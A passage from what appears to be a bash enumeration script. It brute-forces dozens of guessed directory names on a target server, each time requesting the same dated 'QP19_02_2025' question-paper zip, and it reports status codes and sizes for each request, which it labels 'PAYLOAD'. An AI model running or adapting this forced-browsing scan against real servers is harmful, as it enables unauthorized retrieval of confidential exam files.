" "${target}DatabaseManager_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QstnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QstnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-AutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-AutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataProcessing-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataProcessing-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataProcessing-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSyncQPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSyncQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSyncQPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-TestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-TestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocMonitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocMonitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingModule-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingModule-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingModule-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase-BatchUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase-BatchUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-DataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-DataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQ_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQ_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperPanel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperPanel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
